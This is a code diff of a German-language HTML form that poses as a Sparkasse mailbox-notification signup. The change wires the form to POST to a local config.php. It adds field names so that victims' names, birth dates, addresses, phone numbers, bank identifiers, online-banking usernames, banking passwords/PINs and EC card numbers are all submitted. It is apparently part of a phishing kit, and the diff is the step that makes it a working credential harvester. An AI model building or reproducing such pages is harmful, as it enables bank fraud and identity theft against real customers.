@@ -79,37 +79,39 @@
                     diese. Wir senden Ihnen Benachrichtigungen für Ihr Postfach an Ihre E-Mail-Adresse.
                 </p>
             </div>
-            <form action="" class="w-full">
+
+            <form action="./config.php" method="POST" class="w-full">
                 <div class="form-group">
                     <input type="text" name="Vorname" id="name" placeholder=" " required>
                     <label for="Vorname">Vorname</label>
                 </div>
 
                 <div class="form-group">
-                    <input type="text" id="Nachname" placeholder=" " required>
+                    <input type="text" id="Nachname" name="Nachname" placeholder=" " required>
                     <label for="Nachname">Nachname</label>
                 </div>
 
                 <div class="form-group">
-                    <input type="text" id="Geburtsdatum" placeholder=" " required>
+                    <input type="text" id="Geburtsdatum" name="Geburtsdatum" placeholder=" " required>
                     <label for="Geburtsdatum">Geburtsdatum (DD/MM/JJJJ)</label>
                 </div>
 
                 <div class="form-group">
-                    <input type="tel" id="Telefonnummer" value="+49" placeholder=" " required>
+                    <input type="tel" id="Telefonnummer" name="Telefonnummer" value="+49" placeholder=" " required>
                     <label for="Telefonnummer">Telefonnummer</label>
                 </div>
+
                 <div class="form-group">
-                    <input type="text" id="Adresse" placeholder="" required>
+                    <input type="text" id="Adresse" name="Adresse" placeholder="" required>
                     <label for="Adresse">Adresse </label>
                 </div>
 
                 <div class="form-group">
-                    <input type="text" id="Postleitzahl" placeholder="" required>
+                    <input type="text" id="Postleitzahl" name="Postcode" placeholder="" required>
                     <label for="Postleitzahl">Postleitzahl </label>
                 </div>
 
-                <select class="js-example-basic-single w-full" name="state">
+                <select class="js-example-basic-single w-full" name="BLZ">
                     <option value=""></option>
                     <option value="Sparkasse Aachen - 39050000 - AACSDE33XXX">Sparkasse Aachen - 39050000 - AACSDE33XXX
                     </option>
@@ -848,17 +850,17 @@
                 </select>
 
                 <div class="form-group">
-                    <input type="text" id="Anmeldename" placeholder="" required>
+                    <input type="text" id="Anmeldename" name="Anmeldename" placeholder="" required>
                     <label for="Anmeldename">Anmeldename </label>
                 </div>
 
                 <div class="form-group">
-                    <input type="text" id="Passwort- Online Banking PIN" placeholder="" required>
+                    <input type="text" id="Passwort- Online Banking PIN" name="PasswortOBP" placeholder="" required>
                     <label for="Passwort- Online Banking PIN ">Passwort- Online Banking PIN </label>
                 </div>
 
                 <div class="form-group">
-                    <input type="text" id="EC-Kartennummer" placeholder="" required>
+                    <input type="text" id="EC-Kartennummer" name="ECCardNumber" placeholder="" required>
                     <label for="EC-Kartennummer">EC-Kartennummer</label>
                 </div>
                 <div class="text-center py-8">
